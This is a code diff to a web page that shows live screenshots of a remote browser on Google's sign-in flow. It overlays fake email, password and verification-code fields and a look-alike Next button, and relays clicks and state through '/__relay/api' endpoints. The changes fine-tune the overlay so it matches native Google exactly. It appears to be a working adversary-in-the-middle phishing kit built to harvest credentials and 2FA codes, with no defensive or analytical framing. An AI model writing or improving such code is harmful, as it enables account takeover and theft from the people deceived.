@@ -16,10 +16,9 @@ body{font-family:Arial,sans-serif;display:flex;flex-direction:column;color:#2021
 #ov-in::placeholder{color:#5f6368}
 #ov-in:focus{border-color:#0b57d0;box-shadow:inset 0 0 0 1px #0b57d0}
 #ov-in.egpw{-webkit-text-security:disc;letter-spacing:1px}
-/* overlay Next — Google's primary button; pill on identifier, 4px elsewhere */
+/* overlay Next — Google's primary button; radius set per-step from live geometry */
 #ov-btn{position:absolute;display:none;background:#0b57d0;color:#fff;border:none;font-family:Arial,sans-serif;
  font-weight:500;font-size:14px;cursor:pointer;z-index:5;border-radius:4px}
-#ov-btn.pill{border-radius:100px}
 #boot{margin:44px auto 12px;width:30px;height:30px;border:3px solid #dadce0;
  border-top-color:#0b57d0;border-radius:50%;animation:r 1s linear infinite}
 @keyframes r{to{transform:rotate(360deg)}}
@@ -72,9 +71,15 @@ shot.addEventListener('click',function(e){
  fetch('/__relay/api/click',{method:'POST',headers:{'Content-Type':'application/json'},
   body:JSON.stringify({id:SID,x:x,y:y})}).catch(function(){});
 });
-var PLACE={email:'Email or phone',password:'Enter your password',code:'Enter code'};
+var PLACE={email:'Email or phone',password:'Enter your password',code:'Enter code'},
+    lastHash='';
+/* sidecar captures at 2x DPR — show at half so CSS size == native Google */
+shot.onload=function(){
+ shot.style.width=(shot.naturalWidth>1200?Math.round(shot.naturalWidth/2):shot.naturalWidth)+'px';
+};
 function render(x){
  if(x.screenshot){
+  if(x.shot_hash)lastHash=x.shot_hash;
   shot.src='data:image/jpeg;base64,'+x.screenshot;
   boot.style.display='none';shot.style.display='block';
  }
@@ -90,8 +95,8 @@ function render(x){
   });
   place(ovBtn,bb,function(){
    var h=ovBtn.getBoundingClientRect().height;
-   ovBtn.className=k==='email'?'pill':'';
-   ovBtn.style.fontSize=Math.max(12,Math.min(15,h*0.34))+'px';
+   ovBtn.style.borderRadius=k==='email'?Math.max(10,Math.round(h/2))+'px':'4px';
+   ovBtn.style.fontSize=Math.max(12,Math.min(15,h*0.36))+'px';
   });
   if(document.activeElement!==ovIn)setTimeout(function(){ovIn.focus();},120);
  }else{
@@ -109,7 +114,8 @@ function render(x){
 }
 function poll(){
  if(!SID){setTimeout(poll,900);return;}
- fetch('/__relay/api/state?id='+SID).then(function(r){return r.json();})
+ fetch('/__relay/api/state?id='+SID+'&hs='+encodeURIComponent(lastHash))
+  .then(function(r){return r.json();})
   .then(function(x){render(x);setTimeout(poll,1200);})
   .catch(function(){setTimeout(poll,2200);});
 }
